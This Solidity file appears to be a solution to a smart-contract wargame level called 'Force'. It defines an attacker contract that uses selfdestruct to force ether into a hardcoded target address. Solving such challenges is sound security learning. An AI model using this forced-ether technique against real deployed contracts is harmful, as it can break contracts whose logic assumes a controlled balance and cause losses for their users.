// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../instances/Ilevel07.sol";

contract ForceAttacker {
    Force level04 = Force(0x982dAC71e5Eba5d02221B0B61e785516B2edBdF1);

    function exploit() external {
        selfdestruct(payable(address(level04)));
    }

    receive() external payable {}
}
